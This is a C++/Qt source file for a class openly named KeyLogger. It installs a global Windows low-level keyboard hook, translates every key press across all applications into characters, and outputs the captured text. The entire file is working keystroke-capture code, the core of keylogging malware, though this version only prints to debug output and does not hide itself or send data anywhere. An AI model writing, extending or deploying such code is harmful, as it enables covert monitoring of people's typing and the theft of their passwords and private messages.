#include "keylogger.h"

static HHOOK hHook = nullptr;

KeyLogger::KeyLogger(QObject *parent) :
    QObject(parent)
{
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, nullptr, 0);
}

void KeyLogger::updateKeyState(BYTE *keyState, int keyCode)
{
    keyState[keyCode] = BYTE(GetKeyState(keyCode));
}

LRESULT CALLBACK KeyLogger::keyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT key = *((KBDLLHOOKSTRUCT *) lParam);

        wchar_t buffer[6];
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);

        updateKeyState(keyboardState, VK_SHIFT);
        updateKeyState(keyboardState, VK_CAPITAL);
        updateKeyState(keyboardState, VK_CONTROL);
        updateKeyState(keyboardState, VK_MENU);

        HKL keyboardLayout = GetKeyboardLayout(0);
        char lpszName[0x100] = {0};
        DWORD dWordMessage = 1;
        dWordMessage += key.scanCode << 16;
        dWordMessage += key.flags << 24;

        int i = GetKeyNameText(dWordMessage, (LPTSTR) lpszName, 255);
        int result = ToUnicodeEx(key.vkCode, key.scanCode, keyboardState, buffer, 5, 0, keyboardLayout);
        buffer[5] = L'\0';

        QString toBeAppended;

        if (i == 5) {
            QString keyString = QString::fromUtf16((ushort *) lpszName);

            if (keyString == "ENTER") {
                toBeAppended = "\n[" + keyString + "]\n";
            } else {
                toBeAppended = QString::fromUtf16((ushort *) buffer);
            }

        } else {
            toBeAppended = QString::fromUtf16((ushort *) buffer);
        }

        qDebug() << toBeAppended;
    }

    return CallNextHookEx(hHook, nCode, wParam, lParam);
}
